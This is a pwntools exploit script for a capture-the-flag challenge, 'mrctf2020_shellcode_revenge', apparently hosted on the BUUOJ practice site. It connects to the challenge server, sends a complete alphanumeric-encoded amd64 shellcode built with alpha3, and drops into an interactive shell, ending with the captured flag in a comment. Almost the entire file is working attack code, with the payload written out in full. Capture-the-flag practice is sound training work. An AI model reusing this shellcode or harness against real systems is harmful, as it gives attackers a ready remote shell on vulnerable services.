from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'Linux'
context.terminal = ['tmux', 'splitw', '-h']

host = 'node4.buuoj.cn'
port = 25467
elfpath = 'mrctf2020_shellcode_revenge'
libcpath = ''

if args.LOCAL:
    p = process([elfpath])
    # gdb.attach(p)
else:
    p = remote(host, port)
    
s = lambda content: p.send(content)
sl = lambda content: p.sendline(content)
r = lambda n: p.recv(n)
ru = lambda pattern: p.recvuntil(pattern)
rl = lambda: p.recvline()
ru7f = lambda: p.recvuntil(b'\x7f')
su = lambda x: p.success(x)
shell = lambda: p.interactive()

# start pwning

# use shellcode, but every byte of shellcode should be in range (2f, 5a] or [60, 7a], so is (2f, 7a]
# we can use alpha3: https://github.com/SkyLined/alpha3

ascii_shellcode = b"Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t"

ru(b'Show me your magic!\n')
s(ascii_shellcode)

shell()

# flag{7843ae37-57d5-4057-a9ea-eb018c376b06}
